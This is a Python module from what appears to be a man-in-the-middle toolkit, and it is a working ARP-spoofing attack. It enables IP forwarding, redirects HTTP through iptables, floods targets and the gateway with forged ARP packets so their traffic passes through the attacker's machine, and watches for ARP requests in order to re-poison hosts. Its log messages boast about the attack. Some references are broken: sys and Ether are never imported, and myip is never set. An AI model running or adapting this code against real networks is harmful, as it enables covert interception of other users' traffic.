# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import threading
import logging

from traceback import print_exc
from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
from core.logger import logger
from core.utils import set_ip_forwarding, iptables
from time import sleep
from scapy.all import ARP, send, sendp, sniff, getmacbyip

formatter = logging.Formatter("%(asctime)s [ARPpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("ARPpoisoner", formatter)

class ARPpoisoner:
    name      = 'ARP'
    optname   = 'arp'
    desc      = 'Redirect traffic using ARP requests or replies'
    version   = '0.1'

    def __init__(self, options):

        try:
            self.gatewayip  = str(IPAddress(options.gateway))
        except AddrFormatError as e:
            sys.exit("Specified an invalid IP address as gateway")

        self.gatewaymac = getmacbyip(options.gateway)
        self.targets    = self.get_target_range(options.targets)
        self.arpmode    = options.arpmode
        self.debug      = False
        self.send       = True
        self.interval   = 3
        self.interface  = options.interface
        self.mymac      = options.mac

        if self.gatewaymac is None:
            sys.exit("Error: Could not resolve gateway's MAC address")

        log.debug("gatewayip  => {}".format(self.gatewayip))
        log.debug("gatewaymac => {}".format(self.gatewaymac))
        log.debug("targets    => {}".format(self.targets))
        log.debug("mac        => {}".format(self.mymac))
        log.debug("interface  => {}".format(self.interface))
        log.debug("arpmode    => {}".format(self.arpmode))
        log.debug("interval   => {}".format(self.interval))

        set_ip_forwarding(1)
        iptables().flush()
        iptables().http(options.port)

        if self.arpmode == 'rep':
            t = threading.Thread(name='ARPpoisoner-rep', target=self.poison_arp_rep)

        elif self.arpmode == 'req':
            t = threading.Thread(name='ARPpoisoner-req', target=self.poison_arp_req)

        t.setDaemon(True)
        t.start()

        if self.targets is None:
            t = threading.Thread(name='ARPWatch', target=self.start_arp_watch)
            t.setDaemon(True)
            t.start()

    def get_target_range(self, targets):
        if targets is None:
            return None

        try:
            targetList = []
            for target in targets.split(','):

                if '/' in target:
                    targetList.append(IPNetwork(target))

                elif '-' in target:
                    first_half = target.split('-')[0]
                    second_half = first_half + target.split('-')[1]
                    targetList.append(IPRange(first_half, second_half))

                else:
                    targetList.append(IPAddress(target))

            return targetList
        except AddrFormatError as e:
            sys.exit("Specified an invalid IP address/range/network as target")

    def start_arp_watch(self):
        sniff(prn=self.arp_watch_callback, filter="arp", store=0)

    def arp_watch_callback(self, pkt):
        if self.send is True: #Prevents sending packets on exiting
            if ARP in pkt and pkt[ARP].op == 1: #who-has only
                #broadcast mac is 00:00:00:00:00:00
                packet = None
                #print str(pkt[ARP].hwsrc) #mac of sender
                #print str(pkt[ARP].psrc) #ip of sender
                #print str(pkt[ARP].hwdst) #mac of destination (often broadcst)
                #print str(pkt[ARP].pdst) #ip of destination (Who is ...?)

                if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gatewayip and self.myip != str(pkt[ARP].psrc)):
                    log.debug("[ARPWatch] {} is asking where the Gateway is. Sending reply: I'm the gateway biatch!'".format(pkt[ARP].psrc))
                    #send repoison packet
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.gatewayip
                    packet.hwdst = str(pkt[ARP].hwsrc)
                    packet.pdst = str(pkt[ARP].psrc)

                elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
                    log.debug("[ARPWatch] Gateway asking where {} is. Sending reply: I'm {} biatch!".format(pkt[ARP].pdst, pkt[ARP].pdst))
                    #send repoison packet
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.gatewayip
                    packet.hwdst = '00:00:00:00:00:00'
                    packet.pdst = str(pkt[ARP].pdst)

                elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
                    log.debug("[ARPWatch] Gateway asking where {} is. Sending reply: This is the h4xx0r box!".format(pkt[ARP].pdst))

                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.myip
                    packet.hwdst = str(pkt[ARP].hwsrc)
                    packet.pdst = str(pkt[ARP].psrc)

                try:
                    if packet is not None:
                        send(packet, verbose=self.debug, iface=self.interface)
                except Exception as e:
                    if "Interrupted system call" not in e:
                        log.error("[ARPWatch] Exception occurred while sending re-poison packet: {}".format(e))
                    pass

    def poison_arp_rep(self):
        while self.send:

            if self.targets is None:
                pkt = Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op="is-at")
                sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2

            elif self.targets:
                #Since ARP spoofing relies on knowing the targets MAC address, this whole portion is just error handling in case we can't resolve it
                for target in self.targets:

                    if type(target) is IPAddress:
                        targetip = str(target)

                        try:
                            targetmac = getmacbyip(targetip)

                            if targetmac is None:
                                log.debug("Unable to resolve MAC address of {}".format(targetip))

                            elif targetmac:
                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)

                        except Exception as e:
                            if "Interrupted system call" not in e:
                               log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
                            pass

                    if (type(target) is IPRange) or (type(target) is IPNetwork):
                        for targetip in target:
                            try:
                                targetmac = getmacbyip(str(targetip))

                                if targetmac is None:
                                    log.debug("Unable to resolve MAC address of {}".format(targetip))

                                elif targetmac:
                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)

                            except Exception as e:
                                if "Interrupted system call" not in e:
                                   log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
                                   print_exc()
                                pass

            sleep(self.interval)

    def poison_arp_req(self):
        while self.send:

            if self.targets is None:
                pkt = Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mymac, psrc=self.gatewayip, op="who-has")
                sendp(pkt, iface=self.interface, verbose=self.debug) #sends at layer 2

            elif self.targets:

                for target in self.targets:

                    if type(target) is IPAddress:
                        targetip = str(target)
                        try:
                            targetmac = getmacbyip(targetip)

                            if targetmac is None:
                                log.debug("Unable to resolve MAC address of {}".format(targetip))

                            elif targetmac:
                                send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
                                send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)

                        except Exception as e:
                            if "Interrupted system call" not in e:
                               log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
                            pass

                    if (type(target) is IPRange) or (type(target) is IPNetwork):
                        for targetip in target:
                            try:
                                targetmac = getmacbyip(str(targetip))

                                if targetmac is None:
                                    log.debug("Unable to resolve MAC address of {}".format(targetip))

                                elif targetmac:
                                    send(ARP(pdst=str(targetip), psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
                                    send(ARP(pdst=self.gatewayip, psrc=str(targetip), hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)

                            except Exception as e:
                                if "Interrupted system call" not in e:
                                   log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
                                pass

            sleep(self.interval)

    def options(self, options):
        options.add_argument('--gateway', dest='gateway', type=str, help='Gateway ip address')
        options.add_argument('--targets', dest='targets', type=str, help='Specify host/s to poison [if ommited will default to subnet]')
        options.add_argument('--arpmode', dest='arpmode', default='rep', choices=["rep", "req"], help='ARP Spoofing mode: replies (rep) or requests (req) [default: rep]')

    def on_shutdown(self, options):
        self.send = False
        sleep(3)
        self.interval = 1
        count = 5

        if self.targets:
            for target in self.targets:

                if type(target) is IPAddress:
                    targetip = str(target)

                    try:
                        targetmac = getmacbyip(targetip)

                        if targetmac is None:
                            log.debug("Unable to resolve MAC address of {}".format(targetip))

                        elif targetmac:
                            log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))

                            send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
                            send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)

                    except Exception as e:
                        if "Interrupted system call" not in e:
                           log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
                        pass

                if (type(target) is IPRange) or (type(target) is IPNetwork):
                    for targetip in target:
                        try:
                            targetmac = getmacbyip(str(targetip))

                            if targetmac is None:
                                log.debug("Unable to resolve MAC address of {}".format(targetip))

                            elif targetmac:
                                log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))

                                send(ARP(op="is-at", pdst=self.gatewayip, psrc=str(targetip), hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
                                send(ARP(op="is-at", pdst=str(targetip), psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)

                        except Exception as e:
                            if "Interrupted system call" not in e:
                               log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
                            pass

        elif self.targets is None:
            log.info("Restoring subnet connection with {} packets".format(count))
            pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.gatewaymac, psrc=self.gatewayip, op="is-at")
            sendp(pkt, inter=self.interval, count=count, iface=self.interface, verbose=self.debug) #sends at layer 2

        set_ip_forwarding(0)
        iptables().flush()
